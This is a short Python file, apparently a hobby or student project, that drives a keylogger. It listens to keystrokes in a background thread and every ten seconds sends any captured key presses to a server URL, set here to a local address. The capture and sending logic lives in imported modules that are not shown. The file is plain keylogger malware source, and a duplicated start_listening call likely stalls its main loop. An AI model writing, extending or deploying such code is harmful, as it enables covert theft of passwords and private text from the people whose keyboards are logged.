import time
import threading
from Keyboard import KeyBoard
from WritingToTheServer import WritingToTheServer


class KeyLoggerManagement:
    def __init__(self, server_url):
        self.keyBoard = KeyBoard()
        self.write = WritingToTheServer(server_url)

    def management(self):
        listening_thread = threading.Thread(target=self.keyBoard.start_listening)
        listening_thread.daemon = True  # if he stop listening the threading stop
        listening_thread.start()
        self.keyBoard.start_listening()  # start the thread

        while True:
            preses = self.keyBoard.get_key_presses()
            print(preses) #evrey 10 seconds print the presses only for debugging
            if preses: # if not empty send the data to the server
                self.write.send_log(preses)
            time.sleep(10)


if __name__ == '__main__':
    management = KeyLoggerManagement("http://127.0.0.1:5000")
    management.management()
